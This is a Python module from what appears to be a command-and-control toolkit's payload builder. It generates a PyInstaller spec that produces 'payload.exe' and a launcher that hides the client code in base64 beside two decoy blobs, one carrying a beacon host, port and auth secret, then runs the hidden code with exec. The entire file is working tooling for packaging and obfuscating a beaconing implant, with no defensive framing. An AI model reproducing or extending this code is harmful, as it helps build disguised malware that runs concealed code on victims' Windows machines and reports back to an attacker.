"""Windows .exe exporter — PyInstaller spec + companion launcher.

The launcher .py is structurally identical to py_exporter output (3 blobs
+ UUID check) — PyInstaller freezes it into payload.exe. The spec file
itself is unchanged from Phase 5.
"""

from core.config import Config
from exporter.base_exporter import BaseExporter
from exporter.payload_prep import (
    build_decoy1,
    build_decoy2,
    prepare_payload,
)


class ExeExporter(BaseExporter):
    format_name = "exe"
    extension = ".spec"

    BINARY_NAME = "payload"
    LAUNCHER_NAME = "payload_launcher.py"

    def __init__(self, chunk_size=None, beacon_host=None, beacon_port=None):
        kwargs = {}
        if chunk_size is not None:
            kwargs["chunk_size"] = chunk_size
        super().__init__(**kwargs)

        cfg = Config()
        self.beacon_host = beacon_host if beacon_host is not None else cfg.host
        self.beacon_port = beacon_port if beacon_port is not None else cfg.port
        self._master_secret = cfg.auth_secret

    def export(self, client_source: str) -> str:
        """The PyInstaller spec (main output)."""
        launcher = self.LAUNCHER_NAME
        return (
            "# -*- mode: python ; coding: utf-8 -*-\n"
            "# Auto-generated PyInstaller spec. Build with:\n"
            "#     pyinstaller --clean --noconfirm build.spec\n\n"
            "a = Analysis(\n"
            f"    ['{launcher}'],\n"
            "    pathex=[],\n"
            "    binaries=[],\n"
            "    datas=[],\n"
            "    hiddenimports=[],\n"
            "    hookspath=[],\n"
            "    runtime_hooks=[],\n"
            "    excludes=[],\n"
            "    noarchive=False,\n"
            ")\n"
            "pyz = PYZ(a.pure)\n\n"
            "exe = EXE(\n"
            "    pyz,\n"
            "    a.scripts,\n"
            "    a.binaries,\n"
            "    a.datas,\n"
            f"    name='{self.BINARY_NAME}',\n"
            "    debug=False,\n"
            "    bootloader_ignore_signals=False,\n"
            "    strip=False,\n"
            "    upx=True,\n"
            "    console=True,\n"
            ")\n"
        )

    def companion_files(self, client_source: str) -> dict:
        """The launcher .py that the .spec freezes into an .exe."""
        uuid, prepared = prepare_payload(client_source)
        actual = self.payload_literal(prepared)
        decoy1 = self.payload_literal(build_decoy1())
        decoy2 = self.payload_literal(
            build_decoy2(self.beacon_host, self.beacon_port, self._master_secret),
        )

        launcher = (
            "# Auto-generated payload launcher (frozen by PyInstaller).\n"
            "import base64 as _b64\n\n"
            f"_RSC_UUID = {uuid!r}\n"
            "_RSC_LAUNCHED = True\n\n"
            "_ACTUAL_B64 = (\n"
            f"{actual}\n"
            ")\n\n"
            "_DECOY1_B64 = (\n"
            f"{decoy1}\n"
            ")\n\n"
            "_DECOY2_B64 = (\n"
            f"{decoy2}\n"
            ")\n\n"
            "try:\n"
            "    _RSC_LOADER = _b64.b64decode(_DECOY1_B64)\n"
            "    _RSC_DIAG = _b64.b64decode(_DECOY2_B64)\n"
            "except Exception:\n"
            "    _RSC_LOADER = b''\n"
            "    _RSC_DIAG = b''\n\n"
            "def _run():\n"
            "    exec(compile(_b64.b64decode(_ACTUAL_B64), '<payload>', 'exec'))\n\n"
            "if __name__ == '__main__':\n"
            "    _run()\n"
        )
        return {self.LAUNCHER_NAME: launcher}
